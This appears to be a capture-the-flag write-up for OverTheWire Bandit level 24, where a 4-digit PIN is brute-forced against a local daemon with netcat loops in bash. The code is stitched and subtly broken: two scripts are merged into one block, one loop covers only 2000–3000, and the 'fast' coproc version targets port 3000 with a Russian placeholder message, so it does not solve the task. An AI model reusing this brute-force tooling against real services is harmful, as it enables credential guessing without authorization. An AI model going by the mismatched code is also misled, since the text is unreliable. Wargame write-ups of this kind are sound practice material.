# Bandit Level 24 → Level 25
Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

# Solution

```bash
cd $(mktemp -d)
vim find_pass.sh
```

- this is naive version
```vim
#!/bin/bash
RED="\033[31m"
GREEN="\033[32m"
END="\033[0m"

for (( i=2000; i<=3000; i+=1 ))
do
        line=$(printf "<password> %04d" "$i")
        r=$(echo $line | nc -w 1 localhost 30002)
                echo $r >> 2000.txt
        echo $line
done
#!/bin/bash

RED="\033[31m"
GREEN="\033[32m"
END="\033[0m"

for i in $(seq 10000);
do
        line=$(printf "<password_of_level_24> %04d" "$i")
        ret=$(echo $line | nc -w 1 localhost 30002)
	num=$(printf "%04d" "$i")
	if echo "$ret" | grep -q "Wrong!"; then
		echo -e "[$num] -> $RED Wrong! $END"
	else
		echo -e "[$num] -> $GREEN $ret $END"
	fi
done
```

- but this very fast

coproc NC { nc localhost 3000; }
NC_IN="${NC[1]}"
NC_OUT="${NC[0]}"

for i in $(seq 1 100); do
    printf 'сообщение %d\n' "$i" >&"$NC_IN"
    IFS= read -r -t 2 reply <&"$NC_OUT"
    echo "[$i] -> $reply"
done

kill "$NC_PID" 2>/dev/null
```
